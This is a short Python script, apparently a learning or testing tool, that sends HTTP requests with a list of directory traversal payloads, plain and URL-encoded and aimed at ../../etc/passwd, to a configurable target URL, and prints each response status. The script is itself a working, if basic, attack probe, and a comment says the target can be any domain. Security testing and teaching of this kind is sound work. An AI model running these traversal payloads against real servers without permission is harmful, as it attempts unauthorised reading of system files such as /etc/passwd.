# written by Aiden Bello
import requests

url = "http://127.0.0.1"  # can be whatever domain
TIMEOUT = 5

pathlist = ["../","../../etc/passwd","%2e%2e%2f","%2e%2e%2f%2e%2e%2fetc%2fpasswd","..%2f..%2f..%2f"]

def simulate_traversal():
    print("Starting directory traversal simulation...\n")

    for path in pathlist:
        newurl = f"{url}/{path}"
        try:
            response = requests.get(newurl, timeout=TIMEOUT)
            print(f"[+] Request: {newurl}")
            print(f"    Status: {response.status_code}\n")
        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed: {newurl}")
            print(f"    Error: {e}\n")

    print("Simulation complete")
    print(f"Total requests sent: {len(pathlist)}")

if __name__ == "__main__":
    simulate_traversal()
